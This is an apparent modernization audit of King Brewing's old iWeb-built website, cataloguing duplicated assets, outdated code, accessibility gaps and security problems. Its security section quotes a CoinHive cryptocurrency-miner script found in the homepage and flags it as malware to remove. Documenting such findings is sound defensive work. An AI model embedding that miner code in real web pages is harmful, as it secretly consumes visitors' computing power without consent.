# King Brewing Website Legacy Audit

## Purpose

This document provides a comprehensive inventory and analysis of the current King Brewing website, documenting the technical stack, file structure, assets, dependencies, and issues that need to be addressed during modernization.

## Site Structure Inventory

### Main HTML Pages

| Page | File Path | Size | Last Modified | Purpose |
|------|-----------|------|---------------|---------|
| Homepage | Main.html | 17 KB | Dec 2017 | Primary landing page, brewery info |
| Beers | Beers.html | 15 KB | Jan 2013 | Beer list and descriptions |
| Menu | Menu.html | 12 KB | Jul 2011 | Restaurant menu |
| Daily Specials | Daily Specials.html | 10 KB | Jan 2013 | Current specials and promotions |
| Blog | Blog/Blog.html | 12 KB | Jul 2011 | Blog posts and news |
| Podcast | Podcast/Podcast.html | ~12 KB | N/A | Podcast episodes |
| Redirect | index.html | <1 KB | N/A | Redirects to Main.html |

### Asset Directories (_files Pattern)

Each main page has a corresponding `_files/` directory containing page-specific assets. This is a hallmark of iWeb-generated sites:

| Directory | File Count | Total Size | Contains |
|-----------|------------|------------|----------|
| Main_files/ | 38 files | ~800 KB | CSS, JS, navigation PNGs, logo |
| Beers_files/ | 25 files | ~600 KB | CSS, JS, navigation PNGs, logo |
| Menu_files/ | 33 files | ~700 KB | CSS, JS, navigation PNGs, logo, menu images |
| Daily Specials_files/ | 26 files | ~650 KB | CSS, JS, navigation PNGs, logo |
| Blog/Blog_files/ | 29 files | ~650 KB | CSS, JS, navigation PNGs, logo |
| Podcast/Podcast_files/ | ~29 files | ~650 KB | CSS, JS, navigation PNGs, logo |

**Total**: ~181 files, ~4.05 MB (with massive duplication)

### Shared Asset Directories

| Directory | Purpose | File Count | Notable Contents |
|-----------|---------|------------|------------------|
| Images/ | Brewery photos, beer images | 39 files (~1.4 MB) | king-ipa_sm.jpg, king-porter.jpg, event photos |
| photos/ | Photo gallery (iWeb generated) | 100+ files | Event photos, slideshow infrastructure |
| css/ | Shared stylesheets | 18 files | general.css, IE-specific CSS, fonts |
| js/ | Shared JavaScript | 12 files | jquery.js (93KB), modernizr.js (17KB) |

### Supporting Directories

| Directory | Purpose | Status |
|-----------|---------|--------|
| Blog/ | Blog posts and archives | Active |
| Podcast/ | Podcast episodes | Active |
| DrillDown/ | Mobile navigation component | Legacy |
| SimpleBrowser/ | Browser UI component | Legacy |
| TheiDude/ | External/unrelated site | Should remove |
| Volumes/ | Backup/temp files | Should remove |
| test/ | Testing area | Should clean up |
| stats/ | Analytics/statistics | Should review |
| cgi/ | CGI scripts (form handlers) | Legacy |

## Asset Duplication Analysis

### Navigation Images (Critical Duplication)

**Problem**: Each `_files/` directory contains a complete set of navigation images.

**Breakdown**:
- navbar_0_normal.png (Home button)
- navbar_0_rollover.png (Home button hover)
- navbar_1_normal.png (Beers button)
- navbar_1_rollover.png (Beers button hover)
- navbar_2_normal.png (Daily Specials button)
- navbar_2_rollover.png (Daily Specials button hover)
- navbar_3_normal.png (Menu button)
- navbar_3_rollover.png (Menu button hover)
- navbar_4_normal.png (Blog button)
- navbar_4_rollover.png (Blog button hover)
- navbar_5_normal.png (Podcast button - where applicable)
- navbar_5_rollover.png (Podcast button hover - where applicable)
- navbar_active.png (Active page indicator)
- navbar_separator_0.png through navbar_separator_4.png (Button separators)

**Calculation**:
- 15 unique navbar images per set
- 6 `_files/` directories
- 15 × 6 = 90 navbar image files
- Additional separators and variants: ~200 more files
- **Total**: ~294 navbar-related PNG files

**Unique Files Needed**: 15 images
**Actual Files**: 294 images
**Duplication Factor**: 19.6x
**Wasted Space**: ~500-700 KB

### Logo Files (High Duplication)

**Problem**: "King Logo DS3.jpg" is duplicated across multiple directories.

**Locations**:
1. Main_files/King Logo DS3.jpg
2. Beers_files/King Logo DS3.jpg
3. Menu_files/King Logo DS3.jpg
4. Daily Specials_files/King Logo DS3.jpg
5. Blog/Blog_files/King Logo DS3.jpg
6. Podcast/Podcast_files/King Logo DS3.jpg
7. Images/king_logo_ds3.jpg
8. Main_files/king_logo_ds3.jpg (lowercase variant)
9-13. Various _files directories with image effects overlays

**Unique Files Needed**: 1 logo file
**Actual Files**: 13+ copies
**Average File Size**: ~12 KB
**Wasted Space**: ~144 KB

### CSS Files (Medium Duplication)

Each `_files/` directory contains page-specific CSS:
- Main.css, Beers.css, Menu.css, etc.
- Print stylesheet variants
- IE-specific stylesheets (sometimes duplicated)

**Analysis**:
- ~70% of CSS rules are identical across pages
- Navigation styles duplicated in every file
- Typography duplicated in every file
- Layout patterns duplicated in every file

**Consolidation Opportunity**: Shared main.css + page-specific overrides

### JavaScript Files (Medium Duplication)

Each `_files/` directory contains page-specific JS:
- Main.js (~21 KB), Beers.js (~20 KB), Menu.js (~20 KB)
- ~80% of code is identical (font sizing, image mouseover functions)

**Consolidation Opportunity**: Shared navigation.js + minimal page-specific code

### Total Duplication Impact

| Asset Type | Unique Needed | Actual Files | Wasted Space |
|------------|---------------|--------------|--------------|
| Navbar PNGs | 15 | ~294 | ~600 KB |
| Logo | 1 | 13+ | ~150 KB |
| CSS | ~5 files | ~30 files | ~50 KB |
| JS | ~2 files | ~12 files | ~100 KB |
| **TOTAL** | **~23 files** | **~349 files** | **~900 KB** |

## Technology Stack Analysis

### HTML Structure

**Doctype**: XHTML 1.0 Transitional
```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
```

**Generator**: iWeb 1.1.2 (Apple's discontinued website builder)
```html
<meta name="Generator" content="iWeb 1.1.2" />
```

**Layout Approach**:
- Fixed 700px width
- Heavy use of absolute positioning
- Z-index layering (header_layer, nav_layer, body_layer, footer_layer)
- Inline styles for positioning: `style="position: absolute; left: 40px; top: 20px; width: 46px; height: 29px;"`

**Semantic Issues**:
- Minimal semantic HTML (mostly divs)
- Limited use of header, nav, main, footer elements
- Heading hierarchy not always logical

### CSS Architecture

**File Organization**:
- Page-specific CSS in `_files/` directories (Main.css, Beers.css, etc.)
- Shared CSS in `/css/` directory
- IE-specific hacks in separate files (ie.css, ie6.css, ie7.css)

**Key Stylesheets**:

| File | Size | Purpose |
|------|------|---------|
| Main_files/Main.css | ~25 KB | Homepage styles |
| css/general.css | 3.5 KB | Shared utility styles |
| css/media-queries.css | 2.2 KB | Some responsive behavior |
| css/ie.css | ~2 KB | IE8 fixes |
| css/ie6.css | ~2 KB | IE6 hacks |
| css/ie7.css | ~2 KB | IE7 hacks |

**CSS Patterns**:
- Fixed pixel values everywhere
- Absolute positioning for layout
- Font sizes in pixels (not responsive)
- Old-style browser hacks
- Minimal use of classes, heavy use of IDs

**Example Problematic CSS**:
```css
#body_layer {
  position: absolute;
  left: 0px;
  top: 0px;
  width: 700px;
  height: 2055px;
}

.style_1 {
  font-family: TimesNewRomanPSMT;
  font-size: 48px;
  color: #121d8e;
  text-align: left;
}
```

### JavaScript Stack

**Libraries**:
- jQuery 1.x (~93 KB) - only in kb3/ app, not main King Brewing site
- Modernizr (~17 KB) - feature detection

**iWeb-Generated Functions** (in every Main.js, Beers.js, etc.):

1. **Font Sizing**: `InitializeAutoSizingArray()`, `MobileAssetUploader()`
2. **Image Preloading**: `IMpreload()`, `IMmouseover()`, `IMmouseout()`
3. **Navigation**: `NBmouseover()`, `NBmouseout()`
4. **Window Management**: `openSlideShowWindow()`

**Example iWeb JavaScript**:
```javascript
function NBmouseover(id) {
    var nbObj = document.getElementById(id);
    if (nbObj && nbObj.src) {
        nbObj.src = nbObj.src.replace(/_normal\./, '_rollover.');
    }
}

function NBmouseout(id) {
    var nbObj = document.getElementById(id);
    if (nbObj && nbObj.src) {
        nbObj.src = nbObj.src.replace(/_rollover\./, '_normal.');
    }
}
```

**Inline Event Handlers** (throughout HTML):
```html
<a onmouseover="NBmouseover('navbar_0');" onmouseout="NBmouseout('navbar_0');">
```

### Backend & Server Configuration

**Server-Side**:
- **.htaccess**: HTTPS redirection for kingbrewing.info domain
- **PHP files**: first.php (phpinfo), gdform.php (form handler)
- **CGI scripts**: gdform.cgi, gdformssl.cgi (legacy form handlers)

**Analytics**:
- **Deprecated**: urchin.js (old Google Analytics, ~2009-2012 era)
- **Current**: Some pages may have newer GA snippets

**External Dependencies**:
- Google verification tags
- Yahoo verification tags
- Social media links (MySpace - defunct)

## Dependency Inventory

### Third-Party Scripts

| Script | Purpose | Status | Action |
|--------|---------|--------|--------|
| urchin.js | Google Analytics (old) | Deprecated | Replace with GA4 |
| CoinHive | Cryptocurrency miner | MALWARE | Remove immediately |
| Google fonts | (if any) | - | Review/optimize |

### Web Fonts

**Gabrielle Font**:
- Location: `/css/Gabrielle.ttf`
- Also: Webfont kit with .eot, .woff, .svg variants
- License: Dieter Steffmann (free for personal use)
- Usage: Custom headings and decorative text

**System Fonts**:
- TimesNewRomanPSMT
- Helvetica
- Arial (fallback)

### External Resources

- Google Analytics (urchin.js and/or gtag.js)
- Social media links (Twitter, Facebook, MySpace)
- Embedded content (if any): YouTube videos, etc.

## Critical Security Issues

### 1. CoinHive Cryptocurrency Miner (CRITICAL)

**Location**: Main.html, lines 110-115 (approximately)

**Code Snippet**:
```html
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
var miner = new CoinHive.Anonymous('YOUR_SITE_KEY');
miner.start();
</script>
```

**Impact**:
- Hijacks visitor CPU for cryptocurrency mining
- Degrades user experience (slow, hot devices)
- Unethical and likely illegal (no user consent)
- Damages brewery reputation if discovered
- CoinHive service shut down in 2019 but code may still attempt to load

**Action**: Remove immediately (Week 1, Day 1)

### 2. Deprecated Analytics

**Issue**: Old Google Analytics (urchin.js) stopped working in 2012
- No longer tracking visitors correctly
- Missing modern analytics features
- Privacy compliance issues (GDPR, CCPA)

**Action**: Upgrade to Google Analytics 4 (GA4)

### 3. Missing Security Headers

**Current State**:
- No Content Security Policy (CSP)
- No X-Frame-Options
- No X-Content-Type-Options
- No Referrer-Policy

**Action**: Add security headers via .htaccess or server config

### 4. Mixed Content (Potential)

**Issue**: Some resources may load over HTTP when site is HTTPS
- Images from external sources
- Scripts from CDNs
- Embedded content

**Action**: Audit and ensure all resources use HTTPS

### 5. Outdated Form Handlers

**Files**: gdform.cgi, gdformssl.cgi
- Old CGI scripts with potential vulnerabilities
- No CSRF protection
- No input validation visible

**Action**: Review and modernize or replace

## Performance Baseline

### Page Load Analysis (Estimated)

| Page | HTML Size | Total Assets | Estimated Load Time (3G) |
|------|-----------|--------------|--------------------------|
| Main.html | 17 KB | ~850 KB | 3-4 seconds |
| Beers.html | 15 KB | ~650 KB | 2.5-3.5 seconds |
| Menu.html | 12 KB | ~750 KB | 3-3.5 seconds |

### Asset Breakdown (Typical Page)

| Asset Type | Count | Size |
|------------|-------|------|
| HTML | 1 | 10-17 KB |
| CSS | 3-5 | 30-40 KB |
| JavaScript | 2-3 | 20-25 KB |
| Images (navbar) | 15-20 | 200-300 KB |
| Images (content) | 3-8 | 300-500 KB |
| Fonts | 1-2 | 50-100 KB |

### Lighthouse Scores (Estimated Current State)

| Category | Estimated Score | Issues |
|----------|----------------|--------|
| Performance | 60-70 | Large images, render-blocking CSS |
| Accessibility | 70-80 | Missing alt text, poor contrast |
| Best Practices | 50-60 | CoinHive, deprecated libraries, mixed content |
| SEO | 80-90 | Decent meta tags, but can improve |

## Browser Compatibility

### Current Support

**Explicitly Supported**:
- Internet Explorer 6, 7, 8 (via separate CSS files)
- IE9+
- Modern browsers (Chrome, Firefox, Safari, Opera)

**Testing Needed**:
- Mobile browsers (site is not responsive)
- Tablet viewports
- Modern evergreen browsers

### IE-Specific Hacks

**Files**:
- css/ie.css - IE8 fixes
- css/ie6.css - IE6 hacks
- css/ie7.css - IE7 hacks

**Can Be Removed**: IE6-8 market share is now 0.00%

## Content Audit

### Homepage (Main.html)

**Content Issues**:
- Still shows 2009 closure announcement ("After 17 years...")
- Mix of active and archived information
- Outdated event information

**Assets**:
- King Logo DS3.jpg (main logo)
- Various beer images
- Event photos from 2009-2013

### Beers Page

**Content**: List of beers with descriptions
- King IPA
- King Red
- King Porter
- King Pale Ale
- Various seasonal beers

**Assets**: Beer images in Images/ directory

### Menu Page

**Content**: Restaurant menu items
- Appears to be from 2011

**Assets**: Food photos in Menu_files/

### Blog & Podcast

**Content**: Blog posts and podcast episodes
- RSS feeds present
- Archive pages
- Individual post pages

**Status**: Appears inactive since 2011-2013

## File System Issues

### Orphaned/Unused Directories

| Directory | Purpose | Status | Action |
|-----------|---------|--------|--------|
| TheiDude/ | Unrelated site | Remove | Delete |
| Volumes/ | Backup/temp | Remove | Delete |
| test/ | Testing | Review | Clean up or delete |
| NewKingBrewCo/ | (if exists) | Unknown | Review |
| zoran_photos/ | Legacy photos | Archive | Review/delete |
| iPhoneListPatterns/ | Demo code | Remove | Delete |
| stats/ | Analytics data | Review | Keep or delete |

### Naming Inconsistencies

- "Daily Specials.html" (with space)
- "King Logo DS3.jpg" (with space)
- Mix of capitalized and lowercase filenames
- Inconsistent use of hyphens vs spaces

**Action**: Standardize to lowercase-with-hyphens.html

## Accessibility Issues

### Current Problems

1. **Image-based navigation**: No proper alt text
2. **Fixed font sizes**: Can't zoom properly
3. **Poor semantic structure**: Div soup, not semantic HTML5
4. **No ARIA labels**: Screen readers struggle
5. **Color contrast**: Some text may fail WCAG standards
6. **Keyboard navigation**: Image-based buttons may not be keyboard accessible

### WCAG 2.1 Compliance

**Estimated Current Level**: Fails Level A in several areas

**Target**: Level AA compliance

## Mobile Responsiveness

### Current State

**Fixed Width**: 700px everywhere
- No mobile optimization
- Tiny text on phones
- Horizontal scrolling required
- Navigation buttons too small to tap

**Media Queries**: Some present in media-queries.css but minimal

**Mobile Experience**: Poor (fails Google Mobile-Friendly Test)

## Recommendations Summary

### Immediate Actions (Week 1)

1. Remove CoinHive malware from Main.html
2. Create backup of entire site
3. Initialize git repository
4. Set up modern project structure

### High Priority (Weeks 2-3)

1. Consolidate duplicated assets (294 → 15 navbar files)
2. Optimize images (WebP, compression)
3. Convert to HTML5
4. Remove inline styles

### Medium Priority (Week 4)

1. Modernize CSS (Grid/Flexbox)
2. Replace iWeb JavaScript
3. Add responsive design
4. Upgrade analytics to GA4

### Low Priority (Weeks 5-6)

1. Add security headers
2. Implement accessibility improvements
3. Performance optimization
4. SEO enhancements

## Conclusion

The King Brewing website is a well-preserved example of 2009-era web design, created with Apple's iWeb tool. While it has served its purpose, it suffers from:

1. **Critical security vulnerabilities** (CoinHive)
2. **Massive asset duplication** (900KB+ wasted)
3. **Poor mobile experience** (fixed 700px width)
4. **Outdated technology stack** (XHTML, IE6 support, old analytics)
5. **Maintainability challenges** (iWeb-generated code, inline styles)

The modernization project will address all these issues while preserving the brewery's content and visual identity.

---

**Next Steps**: Review SECURITY_FIXES.md for immediate actions, then proceed with ASSET_CONSOLIDATION_STRATEGY.md.
